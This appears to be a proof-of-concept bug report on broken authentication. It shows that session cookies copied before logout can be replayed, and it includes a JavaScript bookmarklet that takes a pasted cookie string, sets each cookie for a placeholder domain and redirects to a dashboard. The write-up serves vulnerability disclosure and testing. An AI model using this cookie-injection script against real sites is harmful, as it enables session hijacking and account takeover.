# Broken Authentacation

**Description**

The session management mechanism is a fundamental security component in the majority of web applications. HTTP itself is a stateless protocol, and session management enables the application to uniquely identify a given user across a number of different requests and to handle the data that it accumulates about the state of that user's interaction with the application.

Because of the key role played by session management mechanisms, they are a prime target for malicious attacks against the application. If an attacker can break an application's session management, they can effectively bypass its authentication controls and masquerade as other application users without knowing their credentials. If an attacker compromises an administrative user in this way, the attacker can own the entire application.

### Steps to Reproduce:

1. First log in into the account, website will create a session for current login.
2. Copy all Cookies and paste it on notepad.
3. Log out your account.
4. Open your chrome browser and right click on **bookmark bar** and ```add page```.
5. Now, on `Edit Bookmark` and paste it on URL and save.
```javascript
/*
Broken Authentacation Script code by ph.hitachi
Email: ph.hitachi@gmail.com
Facebook: https://fb.com/ph.hitachi.gov.ph
*/ 
javascript:void(function(){
    function setCookie(Cookie) { 
    var list = Cookie.split("; "); 
    console.log(list); 
        for (var i = list.length - 1; i >= 0; i--) { 
            var cname = list[i].split("=")[0]; var cvalue = list[i].split("=")[1]; 
            var d = new Date(); d.setTime(d.getTime() + (7*24*60*60*1000)); 
            var expires = ";domain=.example.com;expires="+ d.toUTCString(); //change the .example.com
            document.cookie = cname + "=" + cvalue + "; " + expires; 
        } 
    } 
    function hex2a(hex) { 
        var str = ''; 
        for (var i = 0; i < hex.length; i += 2) {
            var v = parseInt(hex.substr(i, 2), 16); 
            if (v) str += String.fromCharCode(v); 
        } 
    return str; 
    } 
    var cookie = prompt("Broken Authentacation PoC", "Put Cookie here"); 
    setCookie(cookie); 
    location.href = 'https://example.com/dashboard'; //change the https://example.com/dashboard
})();
```
6. Click the bookmark page that you created, make sure you are in https://example.com/ before you click the bookmark that you created to popup this.

![](https://i.imgur.com/mLV03PI.png)

Now put the cookie and you will redirect in `https://example.com/dashboard`


### Video PoC
[![Watch the video](https://i.imgur.com/mLV03PI.png)](https://youtu.be/91tR8O6YaQk)

